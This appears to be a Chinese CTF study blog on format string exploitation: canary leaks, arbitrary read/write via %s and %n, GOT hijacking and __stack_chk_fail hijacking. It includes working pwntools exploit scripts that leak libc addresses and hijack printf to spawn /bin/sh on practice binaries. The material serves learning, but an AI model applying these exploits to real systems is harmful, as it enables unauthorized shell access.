<p>跟过来会发现执行<code>__libc_start_main</code>之前还执行了一些指令,做的工作是将<code>__libc_start_main</code>的地址填到got表里然后调用,这里涉及到lazy bind.linux中动态链接下第一次调用glibc的函数需要通过plt表中的一段代码解析函数的真实地址，具体的解析方式就是_dl_runtime_resolve.</p>
<p>![image-20200212043837877](/Users/sl/Library/Application Support/typora-user-images/image-20200212043837877.png)</p>
<p>这里call的<code>rax(0x4005f6)</code>就是main了,后一条指令地址是<code>__libc_start_main+240</code>会被压入栈中</p>
<p><img src="/Users/sl/Desktop/fmtpic/stack4.png" alt="stack4"></p>
<h2 id="泄漏canary"><a href="#泄漏canary" class="headerlink" title="泄漏canary"></a>泄漏canary</h2><p><code>StackGuard</code>:提供了两种技术来保证攻击者不能伪造canary值：”终止符”和”随机数”,main函数开始时将canary放在<code>rbp-8</code>的位置,结束时比较如果发生改变则进入___stack_chk_fail并退出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> main            proc near               ; DATA XREF: _start+1D↑o</span><br><span class="line">.text:00000000004006A6 format          = byte ptr -70h</span><br><span class="line">.text:00000000004006A6 var_8           = qword ptr -8</span><br><span class="line">.text:00000000004006A6                 push    rbp</span><br><span class="line">.text:00000000004006A7                 mov     rbp, rsp</span><br><span class="line">.text:00000000004006AA                 sub     rsp, 70h</span><br><span class="line">.text:00000000004006AE                 mov     rax, fs:28h</span><br><span class="line">.text:00000000004006B7                 mov     [rbp+var_8], rax</span><br><span class="line">...</span><br><span class="line">.text:0000000000400717                 mov     rdx, [rbp+var_8]</span><br><span class="line">.text:000000000040071B                 xor     rdx, fs:28h</span><br><span class="line">.text:0000000000400724                 jz      short locret_40072B</span><br><span class="line">.text:0000000000400726                 call    ___stack_chk_fail</span><br><span class="line">.text:000000000040072B                 leave</span><br><span class="line">.text:000000000040072C                 retn</span><br><span class="line"></span><br><span class="line">leave执行的操作是</span><br><span class="line">mov rsp,rbp  </span><br><span class="line">pop rbp</span><br><span class="line">假设A调用B</span><br><span class="line">		这样子理解,在A调用函数B的时候,将rbp压入栈,然后mov rbp,rsp,然后就可以抬高rsp生成新的栈帧,即完成了给新函数(B)创建新栈帧的目的</span><br><span class="line">		当B函数返回A时,因为A的rbp在栈里,所以先将自己当前的rbp给rsp(这一步恢复了A的函数的rsp),然后pop rbp,恢复A函数的rbp,做完这两步之后就回到了A执行调用前的环境,继而可以继续开心的执行A函数</span><br></pre></td></tr></table></figure>

<p>canary最低byte位是00, 如果overflow的方式不能写0会很麻烦(如Strcpy),可以用多次写入的方式,以字符串末尾的0来覆盖 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">goal:   AA BB CC 00 DD EE FF 00</span><br><span class="line">write1: XX XX XX XX DD EE FF 00</span><br><span class="line">write2: AA BB CC 00</span><br></pre></td></tr></table></figure>



<p>用[qira]<a href="qira可以记录整个运行的的过程">https://github.com/geohot/qira</a>将程序跑起来,<code>$ qira -s ./practice1</code>,编写exp,先打印出canary,然后将返回地址覆盖为<code>0xaaaabbbbccccdddd</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"127.0.0.1"</span>,<span class="number">4000</span>)</span><br><span class="line">sh.sendline(<span class="string">"%19$016lx&gt;&gt;"</span>)</span><br><span class="line">canary = int(sh.recvuntil(<span class="string">"&gt;&gt;"</span>)[:<span class="number">-2</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(canary)</span><br><span class="line">rop = [</span><br><span class="line">        <span class="number">0xaaaabbbbccccdddd</span></span><br><span class="line">        ]</span><br><span class="line">sh.sendline(<span class="string">"a"</span>*<span class="number">104</span> + p64(canary) + <span class="string">"a"</span>*<span class="number">8</span> + <span class="string">''</span>.join(map(p64,rop)))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>在执行printf时,点击RBP查看内存中的情况,可以印证终端打印的canary是否正确</p>
<p><img src="/Users/sl/Desktop/fmtpic/2.png" alt="2"></p>
<p>可以看到在结束程序后,下一步的返回地址是我们填入的<code>0xaaaabbbbccccdddd</code></p>
<p><img src="/Users/sl/Desktop/fmtpic/1.png" alt=""></p>
<p>##ROP system(“sh”)</p>
<p>然后就可以ROP获取shell了</p>
<ul>
<li>利用已知的libc base获取system地址</li>
</ul>
<ul>
<li>“sh”字符串可以利用gets先读取到可用的buffer中去,buffer可以从bss所在的page的最后面开始用,内存以pa ge为单位配置,bss所在的r/w page后段通常不会用满</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ readelf -aW ./practice1</span><br><span class="line">...</span><br><span class="line">  [26] .bss              NOBITS          0000000000601058 001058 000010 00  WA  0   0  8</span><br><span class="line">  </span><br><span class="line">  let buffer=0x601ff0</span><br></pre></td></tr></table></figure>



<p>##任意位置读取</p>
<p> 使用%s读取内存中的任意地址,%s会把对应的参数当成char *类型,使用限制是stack上要有可以控制地址的buffer,从初始地址开始打印到终止符\0</p>
<ul>
<li>如果是fmt buffer也在stack上的情况,buffer的内容就可以当adress pointer用</li>
<li>定位可控制的buffer位置,找出要使用的是几号参数($)</li>
<li>也可以直接gdb调试计算,64bit在计算参数序列时要加6(实际值加5) </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./practice1</span><br><span class="line">aaaaaaaa %lx %lx %lx %lx %lx %lx</span><br><span class="line">aaaaaaaa 112b044 7f6e439d0790 7f6e439ce8e0 112b045 786c2520786c2520 6161616161616161</span><br></pre></td></tr></table></figure>

<p>###使用可控的address读取mem</p>
<ul>
<li>确定后用<code>&lt;address&gt;.%&lt;X&gt;$s</code>尝试读出address处的值</li>
<li>如果是0就会完全没有多余的输出,一般加个ender会比较方便<ul>
<li>更常有的情况是printf混在一大堆输出里,通常会添加一组标记<code>&lt;address&gt;@@@@%&lt;X&gt;$s@@@@</code>,再用正则匹配将有效信息取出来</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE</span><br><span class="line">0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line">0000000000601058 R_X86_64_COPY     stdout@@GLIBC_2.2.5</span><br><span class="line">0000000000601018 R_X86_64_JUMP_SLOT  __stack_chk_fail@GLIBC_2.4</span><br><span class="line">0000000000601020 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5</span><br><span class="line">0000000000601028 R_X86_64_JUMP_SLOT  alarm@GLIBC_2.2.5</span><br><span class="line">0000000000601030 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5</span><br><span class="line">0000000000601038 R_X86_64_JUMP_SLOT  gets@GLIBC_2.2.5</span><br><span class="line">0000000000601040 R_X86_64_JUMP_SLOT  setvbuf@GLIBC_2.2.5</span><br><span class="line">如p64(_printf_got)=&quot;\x30\x10\x60\x00\x00\x00\x00\x00&quot;</span><br></pre></td></tr></table></figure>

<p>现在直接利用可控address打印出<code>printf_got</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = remote(&quot;127.0.0.1&quot;,4000)</span><br><span class="line">sh.sendline(p64(0x601020) + &quot;%6$lx&gt;&gt;&quot;)</span><br><span class="line">sh.interactive()</span><br><span class="line">输出为:</span><br><span class="line">$ python pra1.py</span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 4000: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">0\x10[*] Got EOF while reading in interactive</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.sendline(p64(0x1111111111601020) + &quot;%6$lx&gt;&gt;&quot;)</span><br><span class="line">输出为:</span><br><span class="line">$ python pra1.py</span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 4000: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">0\x10\x11\x11\x11111111111601020&gt;&gt;$</span><br><span class="line">printf遇到\0就会终止,64bit address高位必为\0,所以address不可以摆在前面,如果fmt部分不做padding的话,后面的address的部分会随着前半fmt的长度变化而变化</span><br><span class="line"></span><br><span class="line">sh.sendline(&quot;%7$lx&quot;.ljust(8,&quot;\x00&quot;) + p64(0x601020))</span><br><span class="line">得到了正确的输出:</span><br><span class="line">$ python pra1.py</span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 4000: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">601020$</span><br></pre></td></tr></table></figure>

<p>接下来将格式化字符改为<code>%7$s</code>,就会将got内容打印出来 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">sh = remote(<span class="string">"127.0.0.1"</span>,<span class="number">4000</span>)</span><br><span class="line">sh.sendline(<span class="string">"%7$s"</span>.ljust(<span class="number">8</span>) + p64(<span class="number">0x601020</span>))</span><br><span class="line">x = sh.recvrepeat(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">print</span> enhex(x)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">输出为:</span><br><span class="line">$ python pra1.py</span><br><span class="line">[+] Opening connection to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> on port <span class="number">4000</span>: Done</span><br><span class="line"><span class="number">20202020201060</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">这里打印不出东西的原因是printf的got地址最低位刚好为<span class="number">0</span>,一般会加一个括号来区分</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">sh = remote(<span class="string">"127.0.0.1"</span>,<span class="number">4000</span>)</span><br><span class="line">sh.sendline(<span class="string">"(%7$s)"</span>.ljust(<span class="number">8</span>) + p64(<span class="number">0x601020</span>))</span><br><span class="line">x = sh.recvrepeat(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">print</span> repr(x)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">输出为:</span><br><span class="line">$ python pra1.py</span><br><span class="line">[+] Opening connection to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> on port <span class="number">4000</span>: Done</span><br><span class="line"><span class="string">'()   \x10`'</span></span><br></pre></td></tr></table></figure>

<p>查看发现确实为低位2byte确实为0,这里就换用<code>__libc_start_main(0x106030)</code>,输出的后1.5个byte和libc中的相同</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ readelf -s    /lib/x86_64-linux-gnu/libc-2.23.so |  grep <span class="string">" printf@"</span></span><br><span class="line">   603: 0000000000055800   161 FUNC    GLOBAL DEFAULT   13 <span class="built_in">printf</span>@@GLIBC_2.2.5</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">sh = remote(<span class="string">"127.0.0.1"</span>,<span class="number">4000</span>)</span><br><span class="line">sh.sendline(<span class="string">'&lt;%7$s&gt;'</span>.ljust(<span class="number">8</span>) + p64(<span class="number">0x601030</span>))</span><br><span class="line">x = sh.recvrepeat(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">print</span> enhex(re.findall(<span class="string">'&lt;(.*)&gt;'</span>,x)[<span class="number">0</span>])</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">输出为:</span><br><span class="line">$ python  pra1.py</span><br><span class="line">[+] Opening connection to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> on port <span class="number">4000</span>: Done</span><br><span class="line"><span class="number">4097</span>a6</span><br><span class="line"></span><br><span class="line">$ readelf -s    /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so |  grep <span class="string">"__libc_start"</span></span><br><span class="line">  <span class="number">2118</span>: <span class="number">0000000000020740</span>   <span class="number">458</span> FUNC    GLOBAL DEFAULT   <span class="number">13</span> __libc_start_main@@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br></pre></td></tr></table></figure>

<p>如果用socat其程序的话,每次得到的地址都不一样,但是低位1.5个byte永远相同,读出的address是6byte的,需要补0后unpack </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socat tcp<span class="_">-l</span>:4000,reuseaddr,fork system:./practice1</span><br><span class="line"></span><br><span class="line">$ python pra1.py</span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 4000: Done</span><br><span class="line">40f702b2287f</span><br><span class="line"></span><br><span class="line">$ python pra1.py</span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 4000: Done</span><br><span class="line">4077917eaf7f</span><br></pre></td></tr></table></figure>



<p>一般来说如果有fmt的话,直接采用第一种<code>%lx</code>来泄漏<code>main return</code>的地址来找到<code>libc base</code>,但是当开启full ASLR保护时连.text字段都会随机化,无法直接从got表上读值,此时需要得到text base或者libc base才可以用后续的ROP,但是好消息是text base 和libc base 是联动的,两者可以一起读出来</p>
<p>例题:</p>
<p><img src="/Users/sl/Desktop/fmtpic/3.png" alt="3"></p>
<p>这是XMAN冬令营结营赛的一道题,思路是首先利用他自带的%s,覆盖canary的最低位,将canary、__libc_csu_init 地址打印出来,就拿到了canary和text base,然后就是ROP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&quot;tmux&quot;,&quot;sp&quot;,&quot;-h&quot;]</span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">elf = ELF(&quot;./baby_ret2libc&quot;)</span><br><span class="line">sh = process(&quot;./baby_ret2libc&quot;)</span><br><span class="line">#sh = remote(&quot;139.9.217.6&quot;,&quot;2333&quot;)</span><br><span class="line">#写题注意recv这个函数接收的数据,one_gadgets在调试的时候可以看下</span><br><span class="line">#执行前哪个环境符合条件</span><br><span class="line">sh.recvuntil(&quot;Your first secret:&quot;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#raw_input(&quot;1:&quot;)</span><br><span class="line">#覆盖canary的最低位,将canary、__libc_csu_init 地址打印出来</span><br><span class="line">payload = &quot;a&quot;*0x85 + &quot;xdsl&quot;</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(&quot;xdsl&quot;)</span><br><span class="line">recv = sh.recv()</span><br><span class="line">#canary 最低位为0,相减得到elf_base  </span><br><span class="line">canary = u64(&quot;\x00&quot; + recv[0:7])</span><br><span class="line">print &quot;canary: &quot; + hex(canary)</span><br><span class="line">elf_base = u64(recv[7:13].ljust(8,&quot;\x00&quot;)) - 0xa50</span><br><span class="line">print &quot;elf_base: &quot; + hex(elf_base)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.sym[&quot;puts&quot;] + elf_base</span><br><span class="line">#puts_plt = 0x7b0 + elf_base</span><br><span class="line">puts_got = elf.got[&quot;puts&quot;] + elf_base</span><br><span class="line">#puts_got = 0x200FA8 + elf_base</span><br><span class="line">pop_rdi = 0x0000000000000ab3 + elf_base</span><br><span class="line">_main = 0x000000000000930 + elf_base</span><br><span class="line">print &quot;pop_rdi: &quot; + hex(pop_rdi) </span><br><span class="line">print &quot;puts_plt: &quot; + hex(puts_plt)</span><br><span class="line"></span><br><span class="line">#puts获取puts_addr</span><br><span class="line">payload2 = &apos;a&apos; * 0x88 + p64(canary) + p64(0) +p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(_main)</span><br><span class="line">sh.send(payload2)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;\n&quot;)</span><br><span class="line">puts_addr = sh.recv()</span><br><span class="line">puts_addr = u64(puts_addr[0:6].ljust(8,&quot;\x00&quot;))</span><br><span class="line">print &quot;puts_addr: &quot; + hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[&quot;puts&quot;] </span><br><span class="line">print  &quot;libc_base: &quot; + hex(libc_base)</span><br><span class="line">one = libc_base + 0xf1147 </span><br><span class="line"></span><br><span class="line">#sh.recvuntil(&quot;:&quot;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#raw_input(&quot;2:&quot;)</span><br><span class="line">print &quot;one:&quot;  + hex(one)</span><br><span class="line">#跳转到main函数再次执行</span><br><span class="line">payload3 = &apos;a&apos; * 0x88 + p64(canary) + p64(0) + p64(one)</span><br><span class="line">sh.send(payload3)</span><br><span class="line">sh.send(&quot;ok&quot;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<p>##任意地址写入</p>
<p>使用%n可以向任意地址写入值,写入的值是「已输出的字节数」,所以要控制%n的写入值,就需要控制%n前的输出正确数量的字节数.使用方法和%s类似,只要将%s改成%n,可以用%XXc来控制输出字节的长度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;address&gt;%100c%10$n</span><br></pre></td></tr></table></figure>

<p>由于%n写入的是int大小的整数,改用%hn或者%hhn来写入short或者char大小的整数,分多次写入组合成完整的int</p>
<h3 id="GOT-Hijack"><a href="#GOT-Hijack" class="headerlink" title="GOT Hijack"></a>GOT Hijack</h3><ul>
<li><p>每次call libc的函数时,会查询GOT来查找需要跳转的地址</p>
</li>
<li><p>可以通过fmt写入改掉GOT上跳转的地址,使得跳转向我们的目标地址</p>
</li>
<li><p>不像ROP可以任意控制参数,只能使用原函数呼叫时的参数,不过有时候会更加方便,如将printf 改成system时,<code>printf(&quot;sh&quot;)</code>就变成了<code>system(&quot;sh&quot;)</code></p>
<p><img src="/Users/sl/Desktop/fmtpic/4.png" alt="4"></p>
</li>
<li><p>使用GOT Hijack 或者修改目标数据时,一般要求一次printf内完成,不然改到一半的值再被利用时会出错,可以把多fmt串联起来,这样子需要小心参数的序数,输出字节数也要计算好.</p>
</li>
<li><p>习惯上会把address放在最前面,然后半段接多个%XXc%hhn,这样子参数的位置比较好计算.64bit 下因为存在截断的问题,所以跟前面讲的一样,需要摆在后面</p>
</li>
<li><p>%n写入的是总字节数,第一次写入100后,第二次如果要写入的值为200时只需要再写入100使总字节数变成200就行</p>
</li>
</ul>
<p>例题:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//编译时关闭了canary和pie保护：</span></span><br><span class="line"><span class="comment">//gcc -m32 demo.c -fno-stack-protector -no-pie -g -o demo</span></span><br><span class="line"><span class="comment">//demo.c 源码</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">char</span> b[<span class="number">100</span>];</span><br><span class="line">    gets(b);</span><br><span class="line">    <span class="built_in">printf</span>(b);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个例子的利用思路就是先使用printf函数泄露某个函数的地址，然后结合libc库，计算出system函数的地址。第二次利用printf函数修改printf函数的got表项内容为system函数的地址，再输入字符串/bin/sh\x00，则再次调用printf函数时，其实会调用system(“/bin/sh”)，这样就可以拿到shell了。</p>
<p>32位程序不会有被地址截断的情况，则格式化串比较好写。<br>可以用%hhn一个字节一个字节写，这样打印的字符就会很少，不至于程序崩溃，当然也可以用%hn两个字节两个字节写入。<br>一个字节写入的模板如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload=p32(target)+p32(target+1)+p32(target+2)+p32(target+3)</span><br><span class="line">payload+=&apos;%&apos;+str(length1)+&apos;c&apos;+&quot;%&quot;+str(offset)+&quot;$hhn&quot;</span><br><span class="line">payload+=&apos;%&apos;+str(length2)+&apos;c&apos;+&quot;%&quot;+str(offset+1)+&quot;$hhn&quot;</span><br><span class="line">payload+=&apos;%&apos;+str(length3)+&apos;c&apos;+&quot;%&quot;+str(offset+2)+&quot;$hhn&quot;</span><br><span class="line">payload+=&apos;%&apos;+str(length4)+&apos;c&apos;+&quot;%&quot;+str(offset+3)+&quot;$hhn&quot;</span><br></pre></td></tr></table></figure>

<p>完整的利用脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">a=process(<span class="string">"./fsb"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./fsb"</span>)</span><br><span class="line">libc=ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">printf_got=elf.got[<span class="string">"printf"</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload=p32(addr)</span><br><span class="line">    payload+=<span class="string">"%7$s"</span></span><br><span class="line">    a.sendline(payload)</span><br><span class="line">    data=a.recv(<span class="number">8</span>)[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(target,printed)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> printed&gt;target:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">256</span>-printed+target)</span><br><span class="line">    <span class="keyword">elif</span> printed==target:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> target-printed</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(target,offset,old)</span>:</span></span><br><span class="line">    t1=target&amp;<span class="number">0xff</span></span><br><span class="line">    t2=target&gt;&gt;<span class="number">8</span>&amp;<span class="number">0xff</span></span><br><span class="line">    t3=target&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xff</span></span><br><span class="line">    t4=target&gt;&gt;<span class="number">24</span>&amp;<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">    payload=p32(old)+p32(old+<span class="number">1</span>)+p32(old+<span class="number">2</span>)+p32(old+<span class="number">3</span>)</span><br><span class="line">    len1=get(t1,len(payload))</span><br><span class="line">    len2=get(t2,(len1)+<span class="number">16</span>)</span><br><span class="line">    len3=get(t3,(len2+len1)+<span class="number">16</span>)</span><br><span class="line">    len4=get(t4,(len3+len2+len1)+<span class="number">16</span>)</span><br><span class="line">    payload+=<span class="string">'%'</span>+str(len1)+<span class="string">'c'</span>+<span class="string">'%'</span>+str(offset)+<span class="string">'$hhn'</span></span><br><span class="line">    payload+=<span class="string">'%'</span>+str(len2)+<span class="string">'c'</span>+<span class="string">'%'</span>+str(offset+<span class="number">1</span>)+<span class="string">'$hhn'</span></span><br><span class="line">    payload+=<span class="string">'%'</span>+str(len3)+<span class="string">'c'</span>+<span class="string">'%'</span>+str(offset+<span class="number">2</span>)+<span class="string">'$hhn'</span></span><br><span class="line">    payload+=<span class="string">'%'</span>+str(len4)+<span class="string">'c'</span>+<span class="string">'%'</span>+str(offset+<span class="number">3</span>)+<span class="string">'$hhn'</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">printf_addr=u32(leak(printf_got))</span><br><span class="line"></span><br><span class="line">system_addr=printf_addr-libc.symbols[<span class="string">"printf"</span>]+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line">payload=modify(system_addr,<span class="number">7</span>,printf_got)</span><br><span class="line"></span><br><span class="line">a.sendline(payload) </span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">a.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>



<p>解释下脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload=p32(old)+p32(old+1)+p32(old+2)+p32(old+3)</span><br></pre></td></tr></table></figure>

<p>这里是先将要修改的got表项的地址写入栈中，然后利用找到的偏移来一个字节一个字节的修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(target,printed)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> printed&gt;target:</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">0x100</span>-printed+target)</span><br><span class="line">        <span class="keyword">elif</span> printed==target:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">return</span> target-printed</span><br></pre></td></tr></table></figure>

<p>get函数是用来计算要打印多少字节的。如果前面覆盖字节所需打印的字符的个数超过了后面要打印字符的个数，则可以通过溢出来调整，例如你想要写入\x00，则你可以打印0x100个字符，因为只能写入一个字节长度，所以高位字节会被截断，只留下\x00。</p>
<p>其他类printf</p>
<ul>
<li><p>fprintf 基本一样,只是buffer string 不在第一个参数,使得overwrite function tables时很不好用</p>
</li>
<li><p>__printf_chk  不太能用的formate string,输出前检查堆栈是否溢出,如果预计会发生溢出，则中止并且退出。</p>
</li>
<li><p>sprintf  可以使用%XXc造成新的buffer overflow </p>
</li>
<li><p>snprintf 有写入长度限制,但是就算超过上限,format string也一样有效果(%10000会当成真的输出10000,即使没有真的输出)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">snprintf</span> 使用情况</span><br><span class="line">i = <span class="built_in">snprintf</span>(a, <span class="number">13</span>, <span class="string">"%012d"</span>, <span class="number">12345</span>);  <span class="comment">// 第 1 种情况</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"i = %lu, a = %s\n"</span>, i, a);    <span class="comment">// 输出：i = 12, a = 000000012345</span></span><br><span class="line">     </span><br><span class="line">i = <span class="built_in">snprintf</span>(a, <span class="number">9</span>, <span class="string">"%012d"</span>, <span class="number">12345</span>);   <span class="comment">// 第 2 种情况</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"i = %lu, a = %s\n"</span>, i, a);    <span class="comment">// 输出：i = 12, a = 00000001</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<p>###__stack_chk_fail Hijack</p>
<ul>
<li><p>修改__stack_chk_fail的GOT,并且破坏canary使函数被调用,在无法overflow时或者没有其他的函数可以Hijack时使用</p>
<ul>
<li>改掉canary上的值,需要泄漏stack address</li>
<li>改掉tls上canary的值,需要ld address</li>
</ul>
<ul>
<li><p>只有一次overflow fmt时,可以将__stack_chk_fail直接改成ret,这样可以无视canary,进入后续的ROP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:000000000040071B                 xor     rdx, fs:28h</span><br><span class="line">.text:0000000000400724                 jz      short locret_40072B</span><br><span class="line">.text:0000000000400726                 call    ___stack_chk_fail</span><br><span class="line">##canary出错时调用___stack_chk_fail,然后这里改成了ret,相当于绕过了canary</span><br><span class="line">.text:000000000040072B locret_40072B:                          ; CODE XREF: main+7E↑j</span><br><span class="line">.text:000000000040072B                 leave</span><br><span class="line">.text:000000000040072C                 retn</span><br><span class="line">.text:000000000040072C ; &#125; // starts at 4006A6</span><br><span class="line">.text:000000000040072C main            endp</span><br></pre></td></tr></table></figure>





</li>
</ul>
</li>
</ul>
<h3 id="Leak-Stack-Address"><a href="#Leak-Stack-Address" class="headerlink" title="Leak Stack Address"></a>Leak Stack Address</h3><ul>
<li><p>Stack上通常会有很多跟satck address有关的指标,泄漏任何一个就可以计算stack 的地址</p>
</li>
<li><p>argv-32bit下,main的第二个参数位置,x64情况下stack上也有一个指针指向argv[]</p>
<p><img src="/Users/sl/Desktop/fmtpic/5.png" alt="5"></p>
</li>
<li><p>rbp/ebp: 在有多层function call时,callee会暂存上一层stack frame的rbp,也可以用来定位stack</p>
</li>
</ul>
<h3 id="Fmt-不在stack上时"><a href="#Fmt-不在stack上时" class="headerlink" title="Fmt 不在stack上时"></a>Fmt 不在stack上时</h3><ul>
<li><p>Format string 在data,bss或是heap上的情况,无法在stack上放一个address给任意读写</p>
</li>
<li><p>可以找其他的input buffer,只要能放上address就可以,不一定要用fmt string,只要比printf输出时buffer地址更高,就可以当参数来用</p>
</li>
<li><p>使用stack上现成指标</p>
<ul>
<li><p>BP chain</p>
<ul>
<li>至少call 两次,main –&gt; A –&gt; B –&gt;printf</li>
<li>对&amp;EBP2使用%hhn就可以修改EBP1的最低位,使EBP1在一个256范围内变动,改好EBP1后再对&amp;EBP1使用%hnn,即可以在stack上写值了.改好了4(or 8)byte后,就可以当作address使用了</li>
<li>由于BP和stack之间的差值固定,最后写入的address在参数的第几个位置固定</li>
</ul>
</li>
<li><p>Argh,argv[0]</p>
<ul>
<li>类似于BP chain,&amp;argv –&gt; argv  –&gt; argv[0]这条chain在stack上写出任意值</li>
</ul>
</li>
